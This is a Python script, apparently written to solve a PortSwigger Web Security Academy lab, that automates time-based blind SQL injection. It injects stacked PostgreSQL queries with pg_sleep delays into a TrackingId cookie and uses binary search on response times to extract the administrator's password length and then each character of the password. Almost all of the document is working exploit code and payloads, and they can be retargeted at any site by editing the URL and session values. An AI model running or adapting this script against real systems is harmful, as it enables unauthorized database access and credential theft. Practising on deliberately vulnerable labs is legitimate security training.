#!/usr/bin/python3

# by caglaroflazoglu
# Time Based Blind-SQL injection script for Portswigger examples (lab-time-delays-info-retrieval)
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

import requests
import math
import time


def timebase(payload, show=False):
    start = time.time()
    result = engine(payload, show)
    stop = time.time()
    #end = math.floor(stop-start)
    end = stop-start

    return [result, end]


def engine(params="", show=False):
    try:
        URL = "https://ac401f3b1ffb07fc80618b3200a500ef.web-security-academy.net/"  # change this

        PARAMS = {"TrackingId": "fXr68EGyfvGJUonn" + params,
                  "session": "dSXLn8Zka5rSl4Qk80UKbh9jWEEft137"  # change this
                  }

        r = requests.get(url=URL, cookies=PARAMS)

        if show:
            # print(PARAMS)
            print(r.content)

        l = len(str(r.content))

        return [r.status_code, l]

    except Exception as ex:
        if show:
            print(ex)
        pass

    return [999, 0]


def enumerate(payload, length, ranges, codes, opt='num', debug=False):
    output = ""
    for i in range(1, length+1, 1):
        wrkrange = ranges.copy()
        while True:
            tcase = math.floor((wrkrange[0]+wrkrange[1])/2)

            if opt == 'pass':
                if tcase == ord(';'):  # unacceptable char
                    tcase += 1
                p1 = chr(tcase)
            else:
                p1 = str(tcase)

            payloadnew = payload.format(p1, i)
            resp = engine(payloadnew, debug)
            print("[?:"+str(resp[0])+"]"+output+"["+p1+"]")

            if resp[0] in codes:
                if tcase == wrkrange[0]:
                    output += p1
                    break
                wrkrange[0] = tcase
            else:
                wrkrange[1] = tcase
    return output


def enumeratetimebase(payload, length, ranges, states, opt='num', debug=False):
    output = ""
    for i in range(1, length+1, 1):
        wrkrange = ranges.copy()
        while True:
            tcase = math.floor((wrkrange[0]+wrkrange[1])/2)

            if opt == 'str':
                if tcase == ord(';'):  # unacceptable char
                    tcase += 1
                p1 = chr(tcase)
            else:
                p1 = str(tcase)

            payloadnew = payload.format(p1, i)
            resp = timebase(payloadnew, debug)
            timex = resp[1]
            timesuccess = False

            if timex > 5 and resp[0][0] == 200:
                timesuccess = True
                
            print("[?:"+str(timesuccess)+" t:"+str(timex)+"]"+output+"["+p1+"]")

            if timesuccess in states:
                if tcase == wrkrange[0]:
                    output += p1
                    break
                wrkrange[0] = tcase
            else:
                wrkrange[1] = tcase
    return output


#payload = "'%3b+select+pg_sleep(2)+--+"
# result=timebase(payload)
# print(result)
default = engine()

if default[0] != 200:
    if default[1] < 1:
        print("Connection problem!")
    else:
        print("Session expired! Change your session id!")
    exit()

#defaultlen = default[1]

# find table name

#payload = "'%3b+select+CASE WHEN length(table_name)>= {} THEN pg_sleep(2) ELSE NULL END+from+information_schema.tables+where+table_name+like+'users%25'+--+"
#tablenamelen = enumeratetimebase(payload, 1,  [1,100], [True], 'num')
#print ("[+] table len: "+tablenamelen)
#exit()


payload = "'%3b+select+CASE WHEN length(password)>= {} THEN pg_sleep(4) ELSE NULL END+from+public.users+where+username%3d'administrator'+--+"

passlen = enumeratetimebase(payload, 1,  [1,100], [True], 'num')

print("[+] password length:"+passlen)


passlen = int(passlen)


#payload = "'%3b+select+CASE WHEN ASCII(substr(password,{1},1))>=ASCII('{0}')+THEN pg_sleep(10) ELSE NULL END+from+public.users+where+username%3d'administrator'+--+"

payload ="'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+ASCII(substring(password,{1},1))>=ASCII('{0}'))+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+--+"

password = enumeratetimebase(payload, passlen, [ord("0"), ord("z")+1], [True], 'str')

print("[!] password:\t"+password)
